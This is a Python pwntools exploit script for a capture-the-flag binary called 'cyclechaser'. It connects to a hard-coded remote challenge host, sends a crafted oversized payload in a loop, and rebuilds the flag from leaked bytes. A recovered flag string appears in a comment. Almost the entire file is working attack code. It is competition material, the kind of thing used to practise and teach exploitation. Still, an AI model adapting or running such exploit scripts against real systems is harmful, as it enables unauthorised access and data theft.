#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from subprocess import check_output
from pwn import *

elf = context.binary = ELF('./cyclechaser', checksec=True)


# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
    host = args.HOST or '3.123.91.129'
    port = int(args.PORT or 13339)
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


gdbscript = '''
# b *main+900
brva 0x1957
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines()
                      if line and not line.startswith('#'))
env = {}

recovered = []
flag = '?'

num = 1
while '?' in flag:
    io = get_conn()
    def r(x): return io.recv(x)
    def rl(): return io.recvline(keepends=False)
    def ru(x): return io.recvuntil(x, drop=True)
    def cl(): return io.clean(timeout=1)
    def s(x): return io.send(x)
    def sa(x, y): return io.sendafter(x, y)
    def sl(x): return io.sendline(x)
    def sla(x, y): return io.sendlineafter(x, y)
    def ia(): return io.interactive()
    def li(s): return log.info(s)
    def ls(s): return log.success(s)

    seed = rl().decode()
    seed = int(seed, 16)

    payload = [p8(num)] * 0x4009
    for i in range(0x4000):
        payload[i] = p8(0)

    payload = b''.join(payload)
    s(payload)

    parts = rl().decode().strip().split(" ")
    parts = list(map(lambda v: int(v, 16), parts))

    recovered.append(parts)

    final = ['?'] * 64
    for r in recovered:
        for i, v in enumerate(r):
            if v != 0 and final[i] == '?':
                final[i] = chr(v)

    flag = 'kalmar{' + ''.join(final) + '}'
    print(flag)
    # kalmar{i_still_have_to_construct_a_flag_of_correct_length_for_this_chal}

    io.close()
    num += 1
